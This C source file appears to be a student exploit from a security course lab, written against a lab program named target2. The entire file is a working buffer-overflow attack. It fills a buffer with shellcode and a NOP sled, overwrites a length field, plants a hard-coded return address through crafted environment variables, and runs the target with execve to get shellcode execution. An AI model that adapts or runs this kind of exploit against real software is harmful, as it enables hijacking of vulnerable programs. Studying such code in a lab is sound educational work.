#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"
#define BUFFER_SIZE 304 //saved rip - &buf
#define BUFFER_ADDRESS 0x0000000040a4fd70
#define MOD_LEN 300

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
    char *    args[3];
    char *    env[5];
    char env_buffer [30];
    char attack_buffer [BUFFER_SIZE];
    char env_end [30];
    int i;
    for (i = 0; i < strlen(shellcode); i++){
	    attack_buffer[i] = shellcode[i];
    }
    for (; i < 272; i++){
	    attack_buffer[i] = 0x90;
    }
    
    int *len_ptr = (int *)(attack_buffer + i);
    *len_ptr = MOD_LEN;
    


    for (i = 0; i < 8; i ++){
	    env_buffer[i] = 0x90;
    }
    env_buffer[8] = 0x1c;
    env_buffer[9] = 0x01;
    // long *addr_ptr = (long *)(env_end);
    // *addr_ptr = BUFFER_ADDRESS;

    for (i = 0; i < 8; i ++){
        env_end[i] = 0x90;
    }
    long *addr_ptr = (long *)(env_end + 8);
    *addr_ptr = BUFFER_ADDRESS;

    args[0] = TARGET;
    
    //insert shell code at the begining
    args[1] = attack_buffer;
    args[2] = NULL;
    

    env[0] = "\0";
    env[1] = env_buffer;
    env[2] = "\0";
    env[3] = env_end;
    env[4] = NULL;

    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}
